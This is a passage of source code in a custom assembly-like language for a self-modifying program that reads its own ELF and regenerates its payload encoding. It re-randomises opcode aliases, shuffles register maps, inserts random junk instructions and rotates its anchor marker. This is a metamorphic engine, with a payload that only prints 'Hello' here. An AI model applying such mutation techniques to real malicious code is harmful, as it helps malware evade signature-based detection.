.include "combined/deltas.inc"

# Section 0 - Anchor target load (Marker for Phase 3)
JNOP
JNOP
JNOP
MOV_REG_IMM64  rax, 0xC001CAFE12345677     # anchor - 1
INC_REG        rax
MOV_REG_REG    r12, rax                    # save target to r12

# Section 1 - Construct and Open argv[0]
MOV_REG_REG    rdi, rsp
ADD_REG_IMM8   rdi, 16
MOV_REG_MEM    rdi, [rdi]   # rdi = argv[0] string pointer

# sys_open(argv[0], O_RDONLY=0)
MOV_REG_IMM8   rax, 2       # sys_open
XOR_REG_REG    rsi, rsi     # O_RDONLY = 0
SYSCALL
MOV_REG_REG    r9, rax      # r9 = fd (temporary)

# Section 2 - Set up ELF buffer pointer
MOV_REG_REG    rax, r14
ADD_REG_IMM32  rax, 0x3000
MOV_REG_REG    rbx, rax     # rbx = ELF buffer base, PERMANENT

# Section 3 - Read ELF, save elf_size, close fd
MOV_REG_IMM8   rax, 0       # sys_read
MOV_REG_REG    rdi, r9      # fd
MOV_REG_REG    rsi, rbx     # buffer = ELF base
MOV_REG_IMM64  rdx, 0x8000  # max 32768 bytes
SYSCALL
MOV_REG_REG    r11, rax     # r11 = elf_size (save IMMEDIATELY)

# Store elf_size at scratch+0x00 (r14+0xD200)
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD200
MOV_MEM_REG    [rdi], r11

# Close fd
MOV_REG_IMM8   rax, 3
MOV_REG_REG    rdi, r9
SYSCALL

# Section 4 - Single anchor scan + delta resolution (Phase 1)
MOV_REG_REG    rsi, rbx
# r12 already has search target from Section 0
MOV_REG_IMM    rcx, 16384                   # 16KB scan bound

SCAN_ANCHOR:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        ANCHOR_NOT_FOUND
    DEC_REG        rcx
    MOV_REG_MEM    r9, [rsi]
    CMP_REG_REG    r9, r12
    JE_REL8        FOUND_ANCHOR
    INC_REG        rsi
    JMP_REL8       SCAN_ANCHOR

ANCHOR_NOT_FOUND:
    MOV_REG_IMM8   rax, 60
    MOV_REG_IMM8   rdi, 1
    SYSCALL

FOUND_ANCHOR:
    # rsi = anchor location in ELF buffer
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD220
    MOV_MEM_REG    [rdi], rsi

    # Resolve reg_alias_map (idx 0)
    MOV_REG_REG    rdi, rsi
    ADD_REG_IMM8   rdi, DELTA_OFF_REG_ALIAS_MAP
    MOV_REG_DWORD_MEM rax, [rdi]
    ADD_REG_REG    rax, rsi
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD218
    MOV_MEM_REG    [rdi], rax

    # Resolve alias_map (idx 1) → r10 (held through section 8)
    MOV_REG_REG    rdi, rsi
    ADD_REG_IMM8   rdi, DELTA_OFF_ALIAS_MAP
    MOV_REG_DWORD_MEM rax, [rdi]
    ADD_REG_REG    rax, rsi
    MOV_REG_REG    r10, rax

    # Resolve payload_start (idx 2) → r11 + scratch
    MOV_REG_REG    rdi, rsi
    ADD_REG_IMM8   rdi, DELTA_OFF_PAYLOAD_START
    MOV_REG_DWORD_MEM rax, [rdi]
    ADD_REG_REG    rax, rsi
    MOV_REG_REG    r11, rax
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD208
    MOV_MEM_REG    [rdi], r11

    # Resolve payload_end → payload_size → scratch
    MOV_REG_REG    rdi, rsi
    ADD_REG_IMM8   rdi, DELTA_OFF_PAYLOAD_END
    MOV_REG_DWORD_MEM rax, [rdi]
    ADD_REG_REG    rax, rsi
    SUB_REG_REG    rax, r11
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD210
    MOV_MEM_REG    [rdi], rax

# PAYLOAD: Print "Hello\n" dynamically
MOV_REG_IMM64  rax, 0x0A6F6C6C6548  # "Hello\n"
PUSH_REG       rax
MOV_REG_IMM8   rax, 1               # sys_write
MOV_REG_IMM8   rdi, 1               # stdout
MOV_REG_REG    rsi, rsp             # rsp points to string
MOV_REG_IMM8   rdx, 6               # length
SYSCALL
ADD_REG_IMM8   rsp, 8               # stack cleanup

# Section 5 - Generate 117 new unique alias bytes into r14+0xD000
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD000     # rdi = write pointer (advances as bytes are stored)
MOV_REG_IMM    rcx, 120        # need 117 unique nonzero bytes

GEN_ALIAS_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        GEN_ALIAS_DONE

  REGEN:
      RDRAND_REG     rax
      JNC_REL8       REGEN

      AND_REG_IMM8   rax, 0x7F

      CMP_REG_IMM8   rax, 0
      JE_REL8        REGEN

      # Uniqueness check: scan [r14+0xD000 .. rdi)
    MOV_REG_REG    rsi, r14
    ADD_REG_IMM32  rsi, 0xD000
    MOV_REG_IMM    rdx, 120
    SUB_REG_REG    rdx, rcx    # rdx = already stored count

CHECK_UNIQUE:
    CMP_REG_IMM8   rdx, 0
    JE_REL8        UNIQUE_OK
    MOV_REG_BYTE_MEM  r9, [rsi]
    CMP_REG_REG    rax, r9
    JE_REL8        REGEN
    INC_REG        rsi
    DEC_REG        rdx
    JMP_REL8       CHECK_UNIQUE

UNIQUE_OK:
    MOV_BYTE_MEM_REG  [rsi], rax    # rsi is now the next free slot
    DEC_REG        rcx
    JMP_REL8       GEN_ALIAS_LOOP

GEN_ALIAS_DONE:

# Section 5b - Generate 16 shuffled reg_alias bytes into r14+0xD300
# Copy 0..15 straight first
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD300
MOV_REG_IMM8   rcx, 0
INIT_REG_MAP_LOOP:
    CMP_REG_IMM8   rcx, 16
    JE_REL8        INIT_REG_MAP_DONE
    MOV_BYTE_MEM_REG [rdi], rcx
    INC_REG        rdi
    INC_REG        rcx
    JMP_REL8       INIT_REG_MAP_LOOP

INIT_REG_MAP_DONE:
# Shuffle 0..7
MOV_REG_IMM8   rcx, 7
SHUFFLE_LOW_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        SHUFFLE_LOW_DONE
    
    CMP_REG_IMM8   rcx, 4
    JE_REL8        SHUF_LOW_SKIP
    CMP_REG_IMM8   rcx, 5
    JE_REL8        SHUF_LOW_SKIP

  SHUF_LOW_REGEN:
    RDRAND_REG     rax
    JNC_REL8       SHUF_LOW_REGEN
    AND_REG_IMM8   rax, 7
    CMP_REG_REG    rax, rcx
    JGE_REL8       SHUF_LOW_REGEN

    CMP_REG_IMM8   rax, 4
    JE_REL8        SHUF_LOW_REGEN
    CMP_REG_IMM8   rax, 5
    JE_REL8        SHUF_LOW_REGEN

    # Swap [r14+0xD300+rcx] with [r14+0xD300+rax]
    MOV_REG_REG    rsi, r14
    ADD_REG_IMM32  rsi, 0xD300
    ADD_REG_REG    rsi, rcx
    MOV_REG_BYTE_MEM r8, [rsi]    # r8 = map[i]

    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD300
    ADD_REG_REG    rdi, rax
    MOV_REG_BYTE_MEM r9, [rdi]    # r9 = map[rnd]

    MOV_BYTE_MEM_REG [rsi], r9
    MOV_BYTE_MEM_REG [rdi], r8

SHUF_LOW_SKIP:
    DEC_REG        rcx
    JMP_REL8       SHUFFLE_LOW_LOOP

SHUFFLE_LOW_DONE:
# Shuffle 8..15
MOV_REG_IMM8   rcx, 15
SHUFFLE_HIGH_LOOP:
    CMP_REG_IMM8   rcx, 8
    JE_REL8        SHUFFLE_HIGH_DONE

    CMP_REG_IMM8   rcx, 14
    JE_REL8        SHUF_HIGH_SKIP
    CMP_REG_IMM8   rcx, 13
    JE_REL8        SHUF_HIGH_SKIP
    CMP_REG_IMM8   rcx, 12
    JE_REL8        SHUF_HIGH_SKIP

  SHUF_HIGH_REGEN:
    RDRAND_REG     rax
    JNC_REL8       SHUF_HIGH_REGEN
    AND_REG_IMM8   rax, 15
    CMP_REG_IMM8   rax, 8
    JL_REL8        SHUF_HIGH_REGEN
    CMP_REG_REG    rax, rcx
    JGE_REL8       SHUF_HIGH_REGEN

    CMP_REG_IMM8   rax, 14
    JE_REL8        SHUF_HIGH_REGEN
    CMP_REG_IMM8   rax, 13
    JE_REL8        SHUF_HIGH_REGEN
    CMP_REG_IMM8   rax, 12
    JE_REL8        SHUF_HIGH_REGEN

    # Swap
    MOV_REG_REG    rsi, r14
    ADD_REG_IMM32  rsi, 0xD300
    ADD_REG_REG    rsi, rcx
    MOV_REG_BYTE_MEM r8, [rsi]    # r8 = map[i]

    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD300
    ADD_REG_REG    rdi, rax
    MOV_REG_BYTE_MEM r9, [rdi]    # r9 = map[rnd]

    MOV_BYTE_MEM_REG [rsi], r9
    MOV_BYTE_MEM_REG [rdi], r8

SHUF_HIGH_SKIP:
    DEC_REG        rcx
    JMP_REL8       SHUFFLE_HIGH_LOOP

SHUFFLE_HIGH_DONE:


# Section 6 — payload boundaries already resolved via deltas in Section 4 (Phase 1).
# r11 = payload_start, scratch[0xD210] = payload_size, scratch[0xD208] = payload_start.

# Section 7 - MUTATE_LOOP with dynamic oplen table
# Construct OPLEN TABLE in scratch space (r14+0xD400)
MOV_REG_IMM64  rax, 0x0404010505000905
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD400
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0101020202020804
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD408
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0101010101010202
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD410
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0202020201010201
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD418
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0202050005020202   # idx 38=MOV_REG_DWORD_MEM oplen=2, idx 39=XOR_REG_IMM8 oplen=2
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD420
MOV_MEM_REG    [rdi], rax

# Construct REG_COUNT TABLE in scratch space (r14+0xD430)
MOV_REG_IMM64  rax, 0x0000000100000101
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD430
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0101010202020000
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD438
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0100000000000201
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD440
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0201010101010201
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD448
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0102010001020202   # idx 38=MOV_REG_DWORD_MEM reg_count=2, idx 39=XOR_REG_IMM8 reg_count=1
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD450
MOV_MEM_REG    [rdi], rax

# Restore rcx = payload_size from scratch (clobbered by GEN_ALIAS + SHUFFLE)
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD210
MOV_REG_MEM    rcx, [rdi]

# Restore r11 = payload_start from scratch (clobbered by Hello print syscall)
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD208
MOV_REG_MEM    r11, [rdi]

MUTATE_LOOP_START:
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xB000  # rdi = mutated payload output pointer
    MOV_REG_REG    rsi, r11     # rsi = payload read ptr (r11 = payload_start)

MUTATE_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        TRAMPOLINE_MUTATE_DONE

    MOV_REG_BYTE_MEM  rax, [rsi]  # read alias byte
    INC_REG        rsi
    DEC_REG        rcx
    PUSH_REG       rcx            # save remaining count

    # Find family: scan r10 (alias_map ptr in ELF) for rax
    MOV_REG_REG    r9, r10
    MOV_REG_IMM8   rdx, 0         # rdx = scan index
    JMP_REL8       FIND_FAMILY

TRAMP_MUTATE_LOOP1:
    JMP_REL8       MUTATE_LOOP

FIND_FAMILY:
    MOV_REG_BYTE_MEM  r11, [r9]
    CMP_REG_REG    rax, r11
    JE_REL8        FOUND_FAMILY
    INC_REG        r9
    INC_REG        rdx
    CMP_REG_IMM8   rdx, 120       # 114 < 128, fits imm8
    JL_REL8        FIND_FAMILY
    POP_REG        rcx
    JMP_REL8       TRAMP_MUTATE_DONE_1    # unknown alias: abort gracefully

FOUND_FAMILY:
    # family = rdx / 3
    MOV_REG_REG    rax, rdx
    XOR_REG_REG    rdx, rdx
    MOV_REG_IMM8   rcx, 3
    DIV_REG        rcx             # rax = family (0–37), rdx = remainder (discarded)

    # Look up oplen from scratch table
    MOV_REG_REG    rcx, r14
    ADD_REG_IMM32  rcx, 0xD400
    ADD_REG_REG    rcx, rax
    MOV_REG_BYTE_MEM  r11, [rcx]   # r11 = operand byte count for this family
    
    PUSH_REG       rax
    JMP_REL8       PICK_SLOT

TRAMP_MUTATE_LOOP_MID:
    JMP_REL8       TRAMP_MUTATE_LOOP1

TRAMPOLINE_MUTATE_DONE:
    JMP_REL8       TRAMP_MUTATE_DONE_1

    # Pick random slot (0, 1, or 2) within family
PICK_SLOT:
    RDRAND_REG     rcx
    JNC_REL8       PICK_SLOT
    AND_REG_IMM8   rcx, 3
    CMP_REG_IMM8   rcx, 3
    JE_REL8        PICK_SLOT

    # new_alias = new_alias_buf[family*3 + slot]
    IMUL_REG_IMM8  rax, 3
    ADD_REG_REG    rax, rcx
    MOV_REG_REG    rcx, r14
    ADD_REG_IMM32  rcx, 0xD000
    ADD_REG_REG    rcx, rax
    MOV_REG_BYTE_MEM  rax, [rcx]

    MOV_BYTE_MEM_REG  [rdi], rax  # write new alias to output
    INC_REG        rdi

    POP_REG        r8             # restore family
    POP_REG        rcx            # restore remaining byte counter
    
    MOV_REG_REG    r9, r11        # r9 = oplen
    SUB_REG_REG    rcx, r9        # account for operand bytes consumed

    # Load reg_count for this family
    MOV_REG_REG    rax, r14
    ADD_REG_IMM32  rax, 0xD430
    ADD_REG_REG    rax, r8
    MOV_REG_BYTE_MEM  r8, [rax]   # r8 = reg_count (0, 1, or 2)

    JMP_REL8       TRANSLATE_REGS_LOOP

TRAMP_MUTATE_DONE_1:
    JMP_REL8       TRAMP_MUTATE_DONE_2

TRAMP_MUTATE_LOOP2:
    JMP_REL8       TRAMP_MUTATE_LOOP_MID

TRANSLATE_REGS_LOOP:
    CMP_REG_IMM8   r8, 0
    JE_REL8        COPY_OPERANDS_LOOP
    # Read old virtual reg ID
    MOV_REG_BYTE_MEM  rax, [rsi]
    
    PUSH_REG       rdi
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD218
    MOV_REG_MEM    rdi, [rdi]
    ADD_REG_REG    rdi, rax
    MOV_REG_BYTE_MEM  rbx, [rdi]  # rbx = NATIVE reg ID
    
    PUSH_REG       r10
    MOV_REG_REG    r10, r14
    ADD_REG_IMM32  r10, 0xD300
    MOV_REG_IMM8   r11, 0
FIND_NEW_VIRT_LOOP:
    MOV_REG_BYTE_MEM  rdi, [r10]
    CMP_REG_REG    rdi, rbx
    JE_REL8        FOUND_NEW_VIRT
    INC_REG        r10
    INC_REG        r11
    JMP_REL8       FIND_NEW_VIRT_LOOP
    
FOUND_NEW_VIRT:
    POP_REG        r10
    POP_REG        rdi
    MOV_BYTE_MEM_REG  [rdi], r11
    
    INC_REG        rsi
    INC_REG        rdi
    DEC_REG        r8
    DEC_REG        r9
    JMP_REL8       TRANSLATE_REGS_LOOP

TRAMP_MUTATE_DONE_2:
    JMP_REL8       MUTATE_DONE

COPY_OPERANDS_LOOP:
    CMP_REG_IMM8   r9, 0
    JE_REL8        TRAMP_MUTATE_LOOP2
    MOV_REG_BYTE_MEM  rax, [rsi]
    MOV_BYTE_MEM_REG  [rdi], rax
    INC_REG        rsi
    INC_REG        rdi
    DEC_REG        r9
    JMP_REL8       COPY_OPERANDS_LOOP

MUTATE_DONE:
    # Compute mutated payload length
    MOV_REG_REG    r11, rdi
    MOV_REG_REG    rax, r14
    ADD_REG_IMM32  rax, 0xB000
    SUB_REG_REG    r11, rax        # r11 = mutated_payload_length

# === Phase 3: Anchor rotation ===
# Step 1: Read new JNOP family aliases into scratch regs (NOT r8/r9/r10/r11)
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD000               # new_alias_buf
ADD_REG_IMM8   rdi, 108                  # JNOP family start index
MOV_REG_BYTE_MEM rax, [rdi]              # rax = ja0
INC_REG        rdi
MOV_REG_BYTE_MEM rbx, [rdi]              # rbx = ja1
INC_REG        rdi
MOV_REG_BYTE_MEM rcx, [rdi]              # rcx = ja2

# Step 2: Scan mutated_payload_buf for triple
MOV_REG_REG    rsi, r14
ADD_REG_IMM32  rsi, 0xB000

SCAN_TRIPLE:
    MOV_REG_REG    rdx, rsi
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xB000
    SUB_REG_REG    rdx, rdi
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD210
    MOV_REG_MEM    rdi, [rdi]
    CMP_REG_REG    rdx, rdi
    JGE_REL8       TRAMP_PHASE_3_DONE_1
    
    MOV_REG_BYTE_MEM rdx, [rsi]
    CMP_REG_REG    rdx, rax
    JE_REL8        T0_OK
    CMP_REG_REG    rdx, rbx
    JE_REL8        T0_OK
    CMP_REG_REG    rdx, rcx
    JE_REL8        T0_OK
    INC_REG        rsi
    JMP_REL8       SCAN_TRIPLE
T0_OK:
    INC_REG        rsi
    MOV_REG_BYTE_MEM rdx, [rsi]
    CMP_REG_REG    rdx, rax
    JE_REL8        T1_OK
    CMP_REG_REG    rdx, rbx
    JE_REL8        T1_OK
    CMP_REG_REG    rdx, rcx
    JE_REL8        T1_OK
    JMP_REL8       SCAN_TRIPLE
T1_OK:
    INC_REG        rsi
    MOV_REG_BYTE_MEM rdx, [rsi]
    CMP_REG_REG    rdx, rax
    JE_REL8        T2_OK
    CMP_REG_REG    rdx, rbx
    JE_REL8        T2_OK
    CMP_REG_REG    rdx, rcx
    JE_REL8        T2_OK
    JMP_REL8       SCAN_TRIPLE
T2_OK:
    INC_REG        rsi
    ADD_REG_IMM8   rsi, 2
    JMP_REL8       GEN_NEW_ANCHOR

TRAMP_PHASE_3_DONE_1:
    JMP_REL8       PHASE_3_DONE

# Step 3: RDRAND new anchor V; save to scratch
GEN_NEW_ANCHOR:
    RDRAND_REG     rax
    JNC_REL8       GEN_NEW_ANCHOR
    CMP_REG_IMM8   rax, 0
    JE_REL8        GEN_NEW_ANCHOR
    MOV_REG_REG    rdx, rax
    INC_REG        rdx
    CMP_REG_IMM8   rdx, 0
    JE_REL8        GEN_NEW_ANCHOR

    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD228
    MOV_MEM_REG    [rdi], rax

    DEC_REG        rax

# Step 4: Patch immediate (V-1) in mutated payload buffer
    MOV_MEM_REG    [rsi], rax

# Step 5: Patch anchor_magic in ELF buffer with V
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD220
    MOV_REG_MEM    rdi, [rdi]
    MOV_REG_REG    rsi, r14
    ADD_REG_IMM32  rsi, 0xD228
    MOV_REG_MEM    rsi, [rsi]
    MOV_MEM_REG    [rdi], rsi

PHASE_3_DONE:


# Section 8 - Patch ELF buffer in memory

# Patch reg_alias_map (16 bytes):
MOV_REG_REG    rsi, r14
ADD_REG_IMM32  rsi, 0xD300         # src: new reg alias bytes
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD218
MOV_REG_MEM    rdi, [rdi]          # dst: reg_alias_map in ELF
MOV_REG_IMM    rcx, 16

PATCH_REG_ALIAS_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        PATCH_REG_ALIAS_DONE
    MOV_REG_BYTE_MEM  rax, [rsi]
    MOV_BYTE_MEM_REG  [rdi], rax
    INC_REG        rsi
    INC_REG        rdi
    DEC_REG        rcx
    JMP_REL8       PATCH_REG_ALIAS_LOOP

PATCH_REG_ALIAS_DONE:

# Patch alias map (117 bytes):
MOV_REG_REG    rsi, r14
ADD_REG_IMM32  rsi, 0xD000         # src: new alias bytes
MOV_REG_REG    rdi, r10            # dst: alias_map in ELF (r10 from section 4)
MOV_REG_IMM    rcx, 120

PATCH_ALIAS_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        PATCH_ALIAS_DONE
    MOV_REG_BYTE_MEM  rax, [rsi]
    MOV_BYTE_MEM_REG  [rdi], rax
    INC_REG        rsi
    INC_REG        rdi
    DEC_REG        rcx
    JMP_REL8       PATCH_ALIAS_LOOP

PATCH_ALIAS_DONE:

# Patch payload (mutated bytes):
# Load payload_start from scratch+0x08
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD208
MOV_REG_MEM    rdi, [rdi]          # rdi = payload_start in ELF (dst)

MOV_REG_REG    rsi, r14
ADD_REG_IMM32  rsi, 0xB000         # src: mutated payload
MOV_REG_REG    rcx, r11            # rcx = mutated_payload_length

PATCH_PAYLOAD_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        PATCH_PAYLOAD_DONE
    MOV_REG_BYTE_MEM  rax, [rsi]
    MOV_BYTE_MEM_REG  [rdi], rax
    INC_REG        rsi
    INC_REG        rdi
    DEC_REG        rcx
    JMP_REL8       PATCH_PAYLOAD_LOOP

PATCH_PAYLOAD_DONE:

# === Phase 2: Junk Slot Fill ===
MOV_REG_IMM8   rcx, 0
JUNK_OUTER:
    # Get slot addr = anchor + delta_table[4 + rcx]
    PUSH_REG       rcx
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD220
    MOV_REG_MEM    rax, [rdi]        # rax = anchor addr
    PUSH_REG       rax
    MOV_REG_REG    rdx, rcx
    ADD_REG_IMM8   rdx, 4
    IMUL_REG_IMM8  rdx, 4            # byte offset
    ADD_REG_IMM8   rdx, 8            # offset in anchor block
    ADD_REG_REG    rax, rdx          # rax points to delta entry
    MOV_REG_DWORD_MEM rbx, [rax]     # rbx = delta
    POP_REG        rax               # restore anchor
    ADD_REG_REG    rax, rbx          # slot addr
    MOV_REG_REG    rdi, rax          # rdi = slot addr
    POP_REG        rcx
    
    PUSH_REG       rcx
    MOV_REG_IMM8   r8, 32            # r8 = remaining size
    
JUNK_INNER:
    CMP_REG_IMM8   r8, 0
    JNE_REL8       PICK_SIZE
    JMP_REL8       JUNK_INNER_DONE_TRAMP1

JUNK_OUTER_TRAMP1:
    JMP_REL8       JUNK_OUTER

PICK_SIZE:
    RDRAND_REG     rax
    JNC_REL8       PICK_SIZE
    AND_REG_IMM8   rax, 0x0F
    XOR_REG_REG    rdx, rdx
    MOV_REG_IMM8   r9, 9
    DIV_REG        r9                # rdx = rax mod 9
    MOV_REG_REG    rax, rdx
    INC_REG        rax               # rax = 1..9
    
    # Clamp to remaining
    CMP_REG_REG    rax, r8
    JL_REL8        SIZE_OK
    JE_REL8        SIZE_OK
    MOV_REG_REG    rax, r8
    JMP_REL8       SIZE_OK

TRAMP_JUNK_INNER_DONE:
    JMP_REL8       JUNK_OUTER_TRAMP
SIZE_OK:
    PUSH_REG       rax
    PUSH_REG       rdi
    
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD220
    MOV_REG_MEM    r9, [rdi]         # anchor
    MOV_REG_REG    r10, r9
    ADD_REG_IMM8   r10, DELTA_OFF_JUNK_TEMPLATES
    MOV_REG_DWORD_MEM r11, [r10]
    ADD_REG_REG    r9, r11           # r9 = junk_templates addr
    
    JMP_REL8       SKIP_TRAMP3
JUNK_INNER_TRAMP1:
    JMP_REL8       JUNK_INNER
JUNK_INNER_DONE_TRAMP1:
    JMP_REL8       JUNK_INNER_DONE_TRAMP2
JUNK_OUTER_TRAMP2:
    JMP_REL8       JUNK_OUTER_TRAMP1
SKIP_TRAMP3:

    MOV_REG_IMM8   rcx, 0            # rcx = count
    MOV_REG_REG    r11, r9           # r11 = scan ptr
COUNT_LOOP:
    MOV_REG_BYTE_MEM rdx, [r11]
    CMP_REG_IMM8   rdx, 0
    JE_REL8        COUNT_DONE
    CMP_REG_REG    rdx, rax   # does size match?
    JNE_REL8       SKIP_INC_COUNT
    INC_REG        rcx
SKIP_INC_COUNT:
    ADD_REG_IMM8   r11, 16
    JMP_REL8       COUNT_LOOP

    JMP_REL8       COUNT_DONE  # Skip tramp
TRAMP_JUNK_INNER_DONE2:
    JMP_REL8       TRAMP_JUNK_INNER_DONE
COUNT_DONE:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        FALLBACK
    JMP_REL8       PICK_NTH

JUNK_OUTER_TRAMP:
    JMP_REL8       JUNK_OUTER_TRAMP2
JUNK_INNER_TRAMP1_5:
    JMP_REL8       JUNK_INNER_TRAMP1

PICK_NTH:
    RDRAND_REG     rbx
    JNC_REL8       PICK_NTH
    PUSH_REG       rax
    MOV_REG_REG    rax, rbx
    XOR_REG_REG    rdx, rdx
    DIV_REG        rcx         # rdx = rax mod rcx
    POP_REG        rax
    
    MOV_REG_REG    r11, r9     # reset scan ptr
FIND_LOOP:
    MOV_REG_BYTE_MEM r12, [r11]
    CMP_REG_REG    r12, rax
    JNE_REL8       SKIP_TEMPLATE
    CMP_REG_IMM8   rdx, 0
    JE_REL8        FOUND_TEMPLATE
    DEC_REG        rdx
SKIP_TEMPLATE:
    ADD_REG_IMM8   r11, 16
    JMP_REL8       FIND_LOOP

JUNK_INNER_DONE_TRAMP2:
    JMP_REL8       JUNK_INNER_DONE

TRAMP_JUNK_INNER_DONE3:
    JMP_REL8       TRAMP_JUNK_INNER_DONE2

FALLBACK:
    POP_REG        rdi
    POP_REG        rax
    MOV_REG_IMM8   rcx, 0x90
    MOV_BYTE_MEM_REG [rdi], rcx
    INC_REG        rdi
    DEC_REG        r8
    JMP_REL8       JUNK_INNER_TRAMP2
    
FOUND_TEMPLATE:
    MOV_REG_BYTE_MEM rax, [r11]     # size (s)
    INC_REG        r11
    MOV_REG_BYTE_MEM rbx, [r11]     # n_random
    INC_REG        r11              # r11 = body ptr
    POP_REG        rdi              # restore slot ptr
    POP_REG        rdx              # clean up size from stack
    
    MOV_REG_REG    rcx, rax
    SUB_REG_REG    rcx, rbx         # rcx = static count
    JMP_REL8       COPY_STATIC

JUNK_INNER_TRAMP2:
    JMP_REL8       JUNK_INNER_TRAMP1_5

COPY_STATIC:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        COPY_RANDOM
    MOV_REG_BYTE_MEM r12, [r11]
    MOV_BYTE_MEM_REG [rdi], r12
    INC_REG        r11
    INC_REG        rdi
    DEC_REG        rcx
    JMP_REL8       COPY_STATIC
COPY_RANDOM:
    CMP_REG_IMM8   rbx, 0
    JE_REL8        TMPL_DONE
  CR:
    RDRAND_REG     r12
    JNC_REL8       CR
    MOV_BYTE_MEM_REG [rdi], r12
    INC_REG        rdi
    INC_REG        r11
    DEC_REG        rbx
    JMP_REL8       COPY_RANDOM
TMPL_DONE:
    SUB_REG_REG    r8, rax          # r8 -= s
    JMP_REL8       JUNK_INNER_TRAMP2

JUNK_INNER_DONE:
    POP_REG        rcx
    INC_REG        rcx
    CMP_REG_IMM8   rcx, 12
    JNE_REL8       TRAMP_JUNK_INNER_DONE3

# === END Phase 2 ===

# === Phase 4: Format dispatch mutation ===

# Resolve perm_table addr (delta idx 17)
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD220
MOV_REG_MEM    rax, [rdi]                  # rax = anchor addr
PUSH_REG       rax                         # save anchor on stack
ADD_REG_IMM8   rax, DELTA_OFF_FORMAT_PERM   # = 76 (gen_deltas.py emits literal)
MOV_REG_DWORD_MEM rdx, [rax]
POP_REG        rax                         # restore anchor
ADD_REG_REG    rdx, rax
MOV_REG_REG    r12, rdx                    # r12 = perm_table addr

# Resolve dispatch_table addr (delta idx 18)
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD220
MOV_REG_MEM    rax, [rdi]
PUSH_REG       rax
ADD_REG_IMM8   rax, DELTA_OFF_FORMAT_DISPATCH  # = 80
MOV_REG_DWORD_MEM rdx, [rax]
POP_REG        rax
ADD_REG_REG    rdx, rax
MOV_REG_REG    r13, rdx                    # r13 = dispatch_table addr

# Snapshot current dispatch_table → r14+0xD500 (72 bytes)
MOV_REG_REG    rsi, r13
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD500
MOV_REG_IMM8   rcx, 9
COPY_DISP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        COPY_DONE
    MOV_REG_MEM    rax, [rsi]
    MOV_MEM_REG    [rdi], rax
    ADD_REG_IMM8   rsi, 8
    ADD_REG_IMM8   rdi, 8
    DEC_REG        rcx
    JMP_REL8       COPY_DISP
COPY_DONE:

# Init perm[i] = i in r14+0xD580 (9 bytes)
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD580
MOV_REG_IMM8   rcx, 0
INIT_P:
    CMP_REG_IMM8   rcx, 9
    JE_REL8        INIT_DONE
    MOV_BYTE_MEM_REG [rdi], rcx
    INC_REG        rdi
    INC_REG        rcx
    JMP_REL8       INIT_P
INIT_DONE:

# Fisher-Yates: i = 8 downto 1, swap perm[i] with perm[rdrand mod (i+1)]
MOV_REG_IMM8   rcx, 8
FY:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        FY_DONE
FY_RAND:
    RDRAND_REG     rax
    JNC_REL8       FY_RAND
    XOR_REG_REG    rdx, rdx
    MOV_REG_REG    r8, rcx
